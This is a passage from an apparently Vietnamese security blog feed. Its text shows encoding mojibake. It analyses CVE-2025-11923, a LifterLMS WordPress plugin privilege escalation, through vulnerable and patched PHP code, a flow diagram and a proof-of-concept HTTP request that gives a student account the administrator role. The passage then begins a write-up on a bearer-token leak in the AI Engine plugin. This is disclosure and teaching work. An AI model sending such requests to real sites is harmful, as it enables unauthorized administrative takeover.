lu√¥n g·ªçi callback &lt;code&gt;rest_cookie_check_errors&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/nonce.png&#39; alt=&#34;Nonce&#34; height=&#34;941&#34; width=&#34;1700&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu kh√¥ng c√≥ nonce trong query/body (&lt;code&gt;_wpnonce&lt;/code&gt;) ho·∫∑c trong header (X-WP-Nonce) th√¨ user hi·ªán t·∫°i s·∫Ω ƒë∆∞·ª£c g√°n &lt;code&gt;id=0&lt;/code&gt; khi·∫øn &lt;code&gt;get_current_user_id()&lt;/code&gt; s·∫Ω tr·∫£ v·ªÅ 0. N·∫øu nonce kh√¥ng h·ª£p l·ªá =&amp;gt; request b·ªã reject ho√†n to√†n.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/invalid.png&#34; title=&#34;Invalid nonce&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/invalid.png&#34; data-sub-html=&#34;&lt;h2&gt;Invalid nonce&lt;/h2&gt;&lt;p&gt;Invalid nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/invalid.png&#39; alt=&#34;Invalid nonce&#34; height=&#34;560&#34; width=&#34;1563&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Invalid nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;ƒê·ªÉ l·∫•y ƒë∆∞·ª£c REST API nonce, ta c·∫ßn ƒëƒÉng nh·∫≠p v√†o Admin Dashboard v√† g·ªçi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt; trong &lt;strong&gt;browser console&lt;/strong&gt;, v√¨ nonce n√†y ch·ªâ ƒë∆∞·ª£c WordPress inject v√†o trang khi ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p h·ª£p l·ªá.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/get_nonce.png&#34; title=&#34;L·∫•y gi√° tr·ªã c·ªßa nonce&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/get_nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Get nonce&lt;/h2&gt;&lt;p&gt;L·∫•y gi√° tr·ªã c·ªßa nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/get_nonce.png&#39; alt=&#34;Get nonce&#34; height=&#34;697&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;L·∫•y gi√° tr·ªã c·ªßa nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi v∆∞·ª£t qua ƒë∆∞·ª£c b∆∞·ªõc ki·ªÉm tra quy·ªÅn, &lt;code&gt;update_item&lt;/code&gt; ƒë∆∞·ª£c g·ªçi:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item( $request ) {&#xA;    $object = $this-&amp;gt;get_object( $request[&amp;#39;id&amp;#39;] );&#xA;    if ( is_wp_error( $object ) ) {&#xA;        return $object;&#xA;    }&#xA;&#xA;    $schema = $this-&amp;gt;get_item_schema();&#xA;    $item   = $this-&amp;gt;prepare_item_for_database( $request );&#xA;    // Exclude additional fields registered via `register_rest_field()`.&#xA;    $item   = array_diff_key( $item, $this-&amp;gt;get_additional_fields() );&#xA;    $object = $this-&amp;gt;update_object( $item, $request );&#xA;    ...&#xA;    $response = $this-&amp;gt;prepare_item_for_response( $object, $request );&#xA;&#xA;    return $response;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y t·∫°o ƒë·ªëi t∆∞·ª£ng student t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;id&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn trong request, sau ƒë√≥ g·ªçi &lt;code&gt;update_object()&lt;/code&gt; ƒë·ªÉ c·∫≠p nh·∫≠t student v·ªõi c√°c tham s·ªë t∆∞∆°ng ·ª©ng:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function update_object( $prepared, $request ) {&#xA;    $prepared[&amp;#39;ID&amp;#39;] = $prepared[&amp;#39;id&amp;#39;];&#xA;&#xA;    $object_id = wp_update_user( $prepared );&#xA;    if ( is_wp_error( $object_id ) ) {&#xA;        return $object_id;&#xA;    }&#xA;&#xA;    unset( $prepared[&amp;#39;ID&amp;#39;] );&#xA;&#xA;    return $this-&amp;gt;update_additional_data( $object_id, $prepared, $request );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Bi·∫øn &lt;code&gt;$prepared&lt;/code&gt; l√† gi√° tr·ªã tr·∫£ v·ªÅ c·ªßa h√†m &lt;code&gt;prepare_item_for_database()&lt;/code&gt;. Tuy nhi√™n, trong qu√° tr√¨nh x·ª≠ l√Ω, field roles ‚Äî v·ªën c·∫ßn thi·∫øt ƒë·ªÉ th·ª±c hi·ªán t·∫•n c√¥ng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; ‚Äî ƒë√£ b·ªã lo·∫°i b·ªè.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/miss_role.png&#34; title=&#34;Roles ƒë√£ b·ªã lo·∫°i kh·ªèi prepare&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/miss_role.png&#34; data-sub-html=&#34;&lt;h2&gt;Miss role&lt;/h2&gt;&lt;p&gt;Roles ƒë√£ b·ªã lo·∫°i kh·ªèi prepare&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/miss_role.png&#39; alt=&#34;Miss role&#34; height=&#34;528&#34; width=&#34;787&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Roles ƒë√£ b·ªã lo·∫°i kh·ªèi prepare&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;code&gt;update_additional_data()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi sau khi d·ªØ li·ªáu ch√≠nh c·ªßa student ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t, nh·∫±m x·ª≠ l√Ω c√°c d·ªØ li·ªáu m·ªü r·ªông (additional data) g·∫Øn v·ªõi user nh∆∞ng kh√¥ng n·∫±m trong b·∫£ng ch√≠nh.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function update_additional_data( $object_id, $prepared, $request ) {&#xA;    $object = $this-&amp;gt;get_object( $object_id );&#xA;    ...&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        $user = $object-&amp;gt;get_user();&#xA;        $user-&amp;gt;set_role( &amp;#39;&amp;#39; );&#xA;        foreach ( $request[&amp;#39;roles&amp;#39;] as $role ) {&#xA;            $user-&amp;gt;add_role( $role );&#xA;        }&#xA;    }&#xA;&#xA;    return $object;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m n√†y t·∫°o ƒë·ªëi t∆∞·ª£ng student t∆∞∆°ng ·ª©ng v·ªõi &lt;code&gt;id&lt;/code&gt; ƒë∆∞·ª£c truy·ªÅn trong request, sau ƒë√≥ duy·ªát qua danh s√°ch &lt;code&gt;roles&lt;/code&gt; do client g·ª≠i l√™n v√† g√°n t·ª´ng role cho user.&lt;/p&gt;&#xA;&lt;p&gt;ƒê√¢y ch√≠nh l√† ƒëi·ªÉm m·∫•u ch·ªët d·∫´n ƒë·∫øn l·ªó h·ªïng &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° ƒë√£ c·∫≠p nh·∫≠t l·∫°i logic ki·ªÉm tra quy·ªÅn trong &lt;code&gt;update_item_permissions_check()&lt;/code&gt; nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function update_item_permissions_check( $request ) {&#xA;&#xA;    if ( is_wp_error( ( new WP_REST_Users_Controller() )-&amp;gt;update_item_permissions_check( $request ) ) ) {&#xA;        return llms_rest_authorization_required_error( __( &amp;#39;You are not allowed to edit this user.&amp;#39;, &amp;#39;lifterlms&amp;#39; ) );&#xA;    }&#xA;&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        return $this-&amp;gt;check_roles_permissions( $request );&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Tr∆∞·ªõc ti√™n, h√†m g·ªçi l·∫°i &lt;code&gt;update_item_permissions_check()&lt;/code&gt; c·ªßa &lt;code&gt;WP_REST_Users_Controller&lt;/code&gt; ƒë·ªÉ ƒë·∫£m b·∫£o to√†n b·ªô c∆° ch·∫ø ki·ªÉm tra quy·ªÅn m·∫∑c ƒë·ªãnh c·ªßa WordPress ƒë∆∞·ª£c √°p d·ª•ng.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu h√†m n√†y tr·∫£ v·ªÅ l·ªói (&lt;code&gt;WP_Error&lt;/code&gt;), request s·∫Ω b·ªã t·ª´ ch·ªëi ngay l·∫≠p t·ª©c.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu request c√≥ ch·ª©a tr∆∞·ªùng &lt;code&gt;roles&lt;/code&gt;, h·ªá th·ªëng ti·∫øp t·ª•c g·ªçi &lt;code&gt;check_roles_permissions()&lt;/code&gt; ƒë·ªÉ ki·ªÉm tra quy·ªÅn g√°n role.&lt;/p&gt;&#xA;&lt;p&gt;N·∫øu kh√¥ng c√≥ &lt;code&gt;roles&lt;/code&gt;, request ƒë∆∞·ª£c cho ph√©p th·ª±c thi.&lt;/p&gt;&#xA;&lt;p&gt;H√†m &lt;code&gt;check_roles_permissions()&lt;/code&gt; ƒë∆∞·ª£c ƒë·ªãnh nghƒ©a nh∆∞ sau:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected function check_roles_permissions( $request ) {&#xA;&#xA;    global $wp_roles;&#xA;&#xA;    $schema = $this-&amp;gt;get_item_schema();&#xA;    $roles  = array();&#xA;&#xA;    if ( ! empty( $request[&amp;#39;roles&amp;#39;] ) ) {&#xA;        $roles = $request[&amp;#39;roles&amp;#39;];&#xA;    } elseif ( ! empty( $schema[&amp;#39;properties&amp;#39;][&amp;#39;roles&amp;#39;][&amp;#39;default&amp;#39;] ) ) {&#xA;        $roles = $schema[&amp;#39;properties&amp;#39;][&amp;#39;roles&amp;#39;][&amp;#39;default&amp;#39;];&#xA;    }&#xA;&#xA;    foreach ( $roles as $role ) {&#xA;&#xA;        if ( ! isset( $wp_roles-&amp;gt;role_objects[ $role ] ) ) {&#xA;            return llms_rest_bad_request_error(&#xA;                sprintf( __( &amp;#39;The role %s does not exist.&amp;#39;, &amp;#39;lifterlms&amp;#39; ), $role )&#xA;            );&#xA;        }&#xA;&#xA;        $potential_role = $wp_roles-&amp;gt;role_objects[ $role ];&#xA;&#xA;        /*&#xA;         * Don&amp;#39;t let anyone with &amp;#39;edit_users&amp;#39; (admins) edit their own role to something without it.&#xA;         * Multisite super admins can freely edit their blog roles -- they possess all caps.&#xA;         */&#xA;        if (&#xA;            ! ( is_multisite() &amp;amp;&amp;amp; current_user_can( &amp;#39;manage_sites&amp;#39; ) )&#xA;            &amp;amp;&amp;amp; get_current_user_id() === $request[&amp;#39;id&amp;#39;]&#xA;            &amp;amp;&amp;amp; ! $potential_role-&amp;gt;has_cap( &amp;#39;edit_users&amp;#39; )&#xA;        ) {&#xA;            return llms_rest_authorization_required_error(&#xA;                __( &amp;#39;You are not allowed to give users this role.&amp;#39;, &amp;#39;lifterlms&amp;#39; )&#xA;            );&#xA;        }&#xA;&#xA;        // Include admin functions to get access to `get_editable_roles()`.&#xA;        require_once ABSPATH . &amp;#39;wp-admin/includes/admin.php&amp;#39;;&#xA;&#xA;        // The new role must be editable by the logged-in user.&#xA;        $editable_roles = get_editable_roles();&#xA;&#xA;        if ( empty( $editable_roles[ $role ] ) ) {&#xA;            return llms_rest_authorization_required_error(&#xA;                __( &amp;#39;You are not allowed to give users this role.&amp;#39;, &amp;#39;lifterlms&amp;#39; )&#xA;            );&#xA;        }&#xA;    }&#xA;&#xA;    return true;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;C∆° ch·∫ø n√†y ƒë·∫£m b·∫£o:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;Lu√¥n k·∫ø th·ª´a ƒë·∫ßy ƒë·ªß ki·ªÉm tra quy·ªÅn g·ªëc c·ªßa WordPress.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng cho ph√©p t·ª± thay ƒë·ªïi role n·∫øu kh√¥ng c√≥ quy·ªÅn t∆∞∆°ng ·ª©ng.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng cho g√°n role kh√¥ng t·ªìn t·∫°i ho·∫∑c kh√¥ng n·∫±m trong danh s√°ch role c√≥ th·ªÉ ch·ªânh s·ª≠a.&lt;/li&gt;&#xA;&lt;li&gt;Lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng &lt;strong&gt;Privilege Escalation&lt;/strong&gt; th√¥ng qua REST API.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Authenticated Student (has valid nonce)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Send POST /wp-json/llms/v1/students/{id}&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;update_item_permissions_check()&amp;#34;]&#xA;&#xA;C --&amp;gt; D{&amp;#34;get_current_user_id() == request.id ?&amp;#34;}&#xA;&#xA;D -- Yes --&amp;gt; E[&amp;#34;Bypass capability checks&amp;#34;]&#xA;D -- No --&amp;gt; F[&amp;#34;Denied&amp;#34;]&#xA;&#xA;E --&amp;gt; G[&amp;#34;update_item()&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;prepare_item_for_database()&amp;#34;]&#xA;H --&amp;gt; I[&amp;#34;roles field removed from prepared data&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;update_object()&amp;#34;]&#xA;J --&amp;gt; K[&amp;#34;update_additional_data()&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;Read roles directly from request&amp;#34;]&#xA;L --&amp;gt; M[&amp;#34;Apply roles via set_role() / add_role()&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;User role escalated&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Login b·∫±ng t√†i kho·∫£n student&lt;/li&gt;&#xA;&lt;li&gt;Login v√†o Admin Dash board v√† l·∫•y nonce t·ª´ browser console th√¥ng qua g·ªçi &lt;code&gt;wpApiSettings.nonce&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;G·ª≠i request:&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-json/llms/v1/students/8 HTTP/1.1&#xA;Host: localhost&#xA;Cookie: student_cookie&#xA;X-WP-Nonce: valid_nonce&#xA;&#xA;roles=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-02-cve-2025-11923/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2026-01-02-cve-2025-11923/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-02-cve-2025-11923/result.png&#39; alt=&#34;Result&#34; height=&#34;912&#34; width=&#34;1540&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác &lt;strong&gt;logic ki·ªÉm tra quy·ªÅn v√† logic c·∫≠p nh·∫≠t d·ªØ li·ªáu b·ªã t√°ch r·ªùi&lt;/strong&gt;, cho ph√©p tr∆∞·ªùng &lt;code&gt;roles&lt;/code&gt; ƒë∆∞·ª£c x·ª≠ l√Ω sau khi v∆∞·ª£t qua b∆∞·ªõc ki·ªÉm tra ban ƒë·∫ßu. ƒêi·ªÅu n√†y khi·∫øn ng∆∞·ªùi d√πng h·ª£p l·ªá c√≥ th·ªÉ t·ª± g√°n quy·ªÅn cao h∆°n cho ch√≠nh m√¨nh th√¥ng qua REST API, d·∫´n ƒë·∫øn &lt;strong&gt;Privilege Escalation&lt;/strong&gt;.&#xA;B·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch √°p d·ª•ng ƒë·∫ßy ƒë·ªß ki·ªÉm tra quy·ªÅn c·ªßa WordPress tr∆∞·ªõc khi cho ph√©p thay ƒë·ªïi role.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Kh√¥ng ƒë∆∞·ª£c x·ª≠ l√Ω d·ªØ li·ªáu nh·∫°y c·∫£m ngo√†i ph·∫°m vi ki·ªÉm tra quy·ªÅn.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;roles&lt;/code&gt; ph·∫£i lu√¥n ƒë∆∞·ª£c ki·ªÉm so√°t b·∫±ng permission g·ªëc c·ªßa WordPress.&lt;/li&gt;&#xA;&lt;li&gt;Ki·ªÉm tra quy·ªÅn c·∫ßn g·∫Øn ch·∫∑t v·ªõi to√†n b·ªô lu·ªìng x·ª≠ l√Ω, kh√¥ng ch·ªâ ·ªü b∆∞·ªõc ƒë·∫ßu.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác t√°ch logic kh√¥ng ƒë·ªìng b·ªô c√≥ th·ªÉ d·∫´n ƒë·∫øn leo thang ƒë·∫∑c quy·ªÅn nghi√™m tr·ªçng.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/lifterlms/vulnerability/wordpress-lifterlms-plugin-various-versions-authenticated-student-privilege-escalation-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress LifterLMS Plugin &amp;lt;= 9.1.0 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-11749 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-01-cve-2025-11749/</link>
      <pubDate>Thu, 01 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-01-cve-2025-11749/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-01-cve-2025-11749/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin AI Engine cho WordPress b·ªã l·ªó h·ªïng &lt;strong&gt;l·ªô th√¥ng tin nh·∫°y c·∫£m&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n t·ª´ tr∆∞·ªõc ƒë·∫øn &lt;strong&gt;3.1.3&lt;/strong&gt;, th√¥ng qua endpoint REST API &lt;strong&gt;/mcp/v1/&lt;/strong&gt;. L·ªó h·ªïng n√†y l√†m l·ªô &lt;strong&gt;Bearer Token&lt;/strong&gt; khi t√πy ch·ªçn &lt;strong&gt;‚ÄúNo-Auth URL‚Äù&lt;/strong&gt; ƒë∆∞·ª£c b·∫≠t. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng &lt;strong&gt;kh√¥ng c·∫ßn x√°c th·ª±c&lt;/strong&gt; l·∫•y ƒë∆∞·ª£c bearer token, t·ª´ ƒë√≥ c√≥ th·ªÉ truy c·∫≠p v√†o m·ªôt phi√™n l√†m vi·ªác h·ª£p l·ªá v√† th·ª±c hi·ªán nhi·ªÅu h√†nh ƒë·ªông nh∆∞ 